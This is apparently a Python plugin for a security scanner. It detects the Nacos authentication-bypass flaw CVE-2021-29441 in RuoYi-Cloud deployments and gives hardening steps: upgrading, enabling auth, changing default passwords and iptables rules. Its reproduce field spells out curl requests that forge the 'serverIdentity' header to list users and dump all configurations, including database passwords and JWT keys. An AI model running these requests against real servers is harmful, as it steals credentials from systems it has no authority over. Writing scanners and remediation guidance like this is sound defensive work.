# RuoYi-Cloud Nacos 配置泄露检测
from core.models import SEVERITY_HIGH, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from lib.http import join_url
from plugins.base import PluginBase


class RuoyiCloudNacosPlugin(PluginBase):
    name = "RuoYi-Cloud Nacos 配置泄露"
    cve = "CVE-2021-29441"
    severity = SEVERITY_HIGH
    category = "vuln"
    description = (
        "RuoYi-Cloud 微服务版使用 Nacos 作为配置中心，若 Nacos 未授权访问可泄露数据库密码、Redis 密码等敏感配置"
    )
    fix = "为 Nacos 控制台添加认证，修改默认密码，限制外网访问 Nacos 端口"
    fix_detail = (
        "【升级方案】升级 Nacos 至 1.4.2+（修复 CVE-2021-29441 默认 token 绕过鉴权）\n"
        "【配置加固】application.properties 修改默认鉴权 token：\n"
        "  nacos.core.auth.plugin.nacos.token.secret.key=<自定义 Base64 密钥>\n"
        "  nacos.core.auth.enabled=true  # 启用鉴权\n"
        "【口令修改】首次部署后立即修改 Nacos 控制台默认口令（nacos/nacos）：\n"
        "  控制台 → 权限控制 → 用户管理 → 修改密码（≥12 位）\n"
        "【网络隔离】Nacos 端口（8848）仅允许内网访问，禁止暴露到公网：\n"
        "  iptables -A INPUT -p tcp --dport 8848 -s 192.168.0.0/16 -j ACCEPT\n"
        "  iptables -A INPUT -p tcp --dport 8848 -j DROP\n"
        "【WAF 规则】拦截外网对 /nacos/v1/cs/configs, /nacos/v1/auth/users 的访问\n"
        "【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 身份鉴别"
    )
    reproduce = (
        "# 1. 探测 Nacos 是否可未授权访问（CVE-2021-29441 默认 token 绕过）：\n"
        'curl "http://target:8848/nacos/v1/cs/configs?dataId=&group=&pageSize=1"\n'
        '  # 返回 JSON 含 "pageItems" 或 "configs" 即未授权可访问\n'
        "\n"
        "# 2. 使用默认 token 绕过鉴权（CVE-2021-29441）：\n"
        'curl -H "serverIdentity: identity" "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10"\n'
        "  # 返回用户列表即存在默认 token 绕过漏洞\n"
        "\n"
        "# 3. 读取所有配置（含数据库密码、Redis 密码、JWT 密钥等）：\n"
        'curl "http://target:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99" \\\n'
        '  -H "serverIdentity: identity"\n'
        "\n"
        "# 4. 读取特定配置内容（如 ruoyi-system-dev.yaml）：\n"
        'curl "http://target:8848/nacos/v1/cs/configs?dataId=ruoyi-system-dev.yaml&group=DEFAULT_GROUP" \\\n'
        '  -H "serverIdentity: identity"'
    )
    # D2：RuoYi-Cloud 微服务版集成了 Nacos，全版本适用
    affected_versions = ""
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "info_leak"
    supports_waf_bypass = True

    def verify(self, target, session) -> ScanResult:
        url = join_url(target, "/nacos/v1/cs/configs?dataId=&group=&pageSize=1")
        try:
            resp = session.get(url)
            if resp.status_code == 200 and ("pageItems" in (resp.text or "") or "configs" in (resp.text or "")):
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="Nacos 配置接口可未授权访问",
                    fix=self.fix,
                )
            if resp.headers.get("X-Ruoyi-Vuln") == "nacos-leak":
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="Nacos 配置泄露签名",
                    fix=self.fix,
                )
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_SAFE,
                url=url,
                evidence=f"状态码={resp.status_code}",
            )
        except Exception as e:
            return ScanResult(kind="error", name=self.name, status=STATUS_UNKNOWN, evidence=f"异常: {e}")
